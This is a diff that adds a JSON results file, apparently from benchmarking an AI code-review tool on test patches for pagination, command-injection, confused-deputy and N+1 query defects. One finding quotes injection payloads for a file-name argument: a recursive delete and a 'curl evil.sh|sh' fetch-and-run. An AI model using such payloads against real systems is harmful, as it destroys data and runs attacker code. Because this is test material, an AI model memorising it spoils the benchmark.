@@ -1,0 +1,285 @@
+{
+  "static_surface_reduction": {
+    "local": {
+      "total_words_with_specialist_depth": 83154,
+      "specialist_depth_words": 9379,
+      "total_words_when_not_needed": 73775,
+      "reduction_pct": 11.28
+    },
+    "github": {
+      "total_words_with_specialist_depth": 112342,
+      "specialist_depth_words": 9379,
+      "total_words_when_not_needed": 102963,
+      "reduction_pct": 8.35
+    }
+  },
+  "behavioral_proof": {
+    "run": {
+      "ok": true,
+      "cases": [
+        {
+          "id": "correctness-off-by-one-pagination",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P0",
+              "location": {
+                "path": "app/pagination.py",
+                "lines": {
+                  "start": 3,
+                  "end": 4
+                }
+              },
+              "claim": "Pagination returns one extra item per page (off-by-one) `end = offset + page_size + 1` then `items[offset:end]` \u2014 for `page_size=N`, the slice length is `N+1`, not `N`. E.g. `page(list(range(10)), 1, 3)` returns `[0, 1, 2, 3]` (4 items) instead of `[0, 1, 2]`, and the extra item duplicates the first item of the next page.",
+              "extra": {
+                "defect_kind": "off-by-one"
+              }
+            }
+          ]
+        },
+        {
+          "id": "no-op-comment-and-rename",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": []
+        },
+        {
+          "id": "quality-duplicated-branch-logic",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P2",
+              "location": {
+                "path": "app/notify.py",
+                "lines": {
+                  "start": 3,
+                  "end": 6
+                }
+              },
+              "claim": "`format_message(user)` is duplicated across the email and sms branches `msg = format_message(user)` is called identically at line 3 (email branch) and line 6 (sms branch); only the send call and destination differ (`send_email(user.email, msg)` vs `send_sms(user.phone, msg)`). The two branches now independently own the same message-construction step; a future change to how the message is built (e.g. per-channel formatting) requires updating both branches in lockstep, and it's easy to update one and miss the other as more channels are added.",
+              "extra": {
+                "defect_kind": "duplicated-logic"
+              }
+            }
+          ]
+        },
+        {
+          "id": "security-command-injection",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P0",
+              "location": {
+                "path": "app/backup.py",
+                "lines": {
+                  "start": 5,
+                  "end": 6
+                }
+              },
+              "claim": "Shell command injection via unsanitized `name` in `make_archive` `cmd = f\"tar -czf {name}.tar.gz data/\"` is built by interpolating the caller-supplied `name` directly into a shell string, then executed with `subprocess.run(cmd, shell=True, check=True)`. The prior version passed an argument list (`[\"tar\", \"-czf\", name + \".tar.gz\", \"data/\"]`) without `shell=True`, which did not invoke a shell and could not interpret shell metacharacters in `name`. Any caller-controlled `name` containing shell metacharacters (e.g. `\"; rm -rf / #\"`, `\"$(curl evil.sh|sh)\"`, backticks, `&&`, `|`) is now interpreted by `/bin/sh` and executed as arbitrary shell code.",
+              "extra": {
+                "defect_kind": "command-injection"
+              }
+            }
+          ]
+        },
+        {
+          "id": "specialist-depth-composition-case-a-zero-capabilities-base-reasoning-complete",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P0",
+              "location": {
+                "path": "app/pricing/discount.py",
+                "line": 14
+              },
+              "claim": "Discount validation never triggers due to impossible boolean condition `if discount_percent > 100 and discount_percent < 0:` \u2014 no value can be simultaneously greater than 100 and less than 0, so this condition is always `False`. The pre-image used `or`. As a result, `apply_discount` never raises `ValueError` for any out-of-range `discount_percent`, e.g. `apply_discount(order, 150)` returns a negative total, and `apply_discount(order, -50)` inflates the total above the eligible sum instead of raising.",
+              "extra": {
+                "defect_kind": "logic-operator-swap"
+              }
+            }
+          ]
+        },
+        {
+          "id": "specialist-depth-composition-case-b-one-capability-security-confused-deputy",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P0",
+              "location": {
+                "path": "worker/job_processor.py",
+                "lines": {
+                  "start": 11,
+                  "end": 18
+                }
+              },
+              "claim": "`transfer_funds` job handler performs privileged fund transfers with no authorization check The new `transfer_funds` branch reads `source_account`, `destination_account`, and `amount` straight out of the untrusted `job[\"payload\"]` and passes them to `service_client.transfer(...)` using the module-level `SERVICE_CREDENTIALS` (a privileged service credential loaded once at import time, `worker/job_processor.py:3`). Nothing in `process_job` verifies that whoever enqueued the job is entitled to move funds out of `source_account`, or that the job's originating identity matches the account being debited. Any producer able to enqueue a `transfer_funds` job (the worker has no visibility into who created it) can move money out of an arbitrary `source_account` to an arbitrary `destination_account`, because the worker's own high-privilege credentials \u2014 not the requester's authority \u2014 are what actually authorize the transfer with the downstream service. This is the classic confused-deputy shape: a privileged intermediary executes an action fully parameterized by an unverified caller.",
+              "extra": {
+                "defect_kind": "confused-deputy"
+              }
+            },
+            {
+              "severity": "P1",
+              "location": {
+                "path": "worker/job_processor.py",
+                "lines": {
+                  "start": 11,
+                  "end": 18
+                }
+              },
+              "claim": "Fund transfers have no idempotency/duplicate-execution protection The `transfer_funds` branch calls the side-effecting `service_client.transfer(...)` with no idempotency key and no record of already-processed jobs. A worker crash/timeout after the call succeeds but before the job is acknowledged, or any at-least-once redelivery of the same job, re-enters `process_job` and calls `transfer` again with identical arguments. A single logical transfer can be executed more than once, moving funds twice for one requested operation.",
+              "extra": {
+                "defect_kind": "missing-idempotency"
+              }
+            }
+          ]
+        },
+        {
+          "id": "specialist-depth-progressive-loading-proof-ambiguous-cardinality-forces-fail-closed-load",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P1",
+              "location": {
+                "path": "app/reports/order_export.py",
+                "line": 11
+              },
+              "claim": "Per-order shipment lookup in export loop causes N+1 queries The loop previously only read already-loaded scalar attributes (`order.id`, `order.customer_email`, `order.total`). The diff adds `order.shipment_events.all().order_by(\"-created_at\").first()` executed once per iteration of `for order in orders`, which issues a separate related-manager query for every order in the collection. For any non-trivial order count, this report's query volume now scales linearly with the number of orders instead of staying constant, multiplying database round-trips and materially slowing generation and increasing DB load for what is likely a bulk/reporting code path.",
+              "extra": {
+                "defect_kind": "n-plus-one-query"
+              }
+            }
+          ]
+        }
+      ]
+    },
+    "regression_vs_408_baseline": {
+      "cases": [
+        {
+          "id": "correctness-off-by-one-pagination",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "no-op-comment-and-rename",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "quality-duplicated-branch-logic",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "security-command-injection",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        }
+      ],
+      "aggregate": {
+        "total_false_negatives": 0,
+        "total_false_positives": 0,
+        "cases_with_false_negatives": 0,
+        "cases_with_false_positives": 0,
+        "total_near_misses": 0,
+        "errored_cases": 0
+      }
+    },
+    "activation_required_cases": {
+      "cases": [
+        {
+          "id": "specialist-depth-composition-case-a-zero-capabilities-base-reasoning-complete",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 1,
+          "false_positives": 1,
+          "missed_keys": [
+            "discount-percent-guard-broken-by-and"
+          ],
+          "incorrect_indices": [
+            0
+          ],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "specialist-depth-composition-case-b-one-capability-security-confused-deputy",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 1,
+          "false_positives": 2,
+          "missed_keys": [
+            "transfer-funds-confused-deputy"
+          ],
+          "incorrect_indices": [
+            0,
+            1
+          ],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "specialist-depth-progressive-loading-proof-ambiguous-cardinality-forces-fail-closed-load",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        }
+      ],
+      "aggregate": {
+        "total_false_negatives": 2,
+        "total_false_positives": 3,
+        "cases_with_false_negatives": 2,
+        "cases_with_false_positives": 2,
+        "total_near_misses": 0,
+        "errored_cases": 0
+      }
+    },
+    "case_roles": {
+      "specialist-depth-composition-case-a-zero-capabilities-base-reasoning-complete": "not-needed",
+      "specialist-depth-composition-case-b-one-capability-security-confused-deputy": "must-activate",
+      "specialist-depth-progressive-loading-proof-ambiguous-cardinality-forces-fail-closed-load": "ambiguous-fail-closed"
+    }
+  }
+}
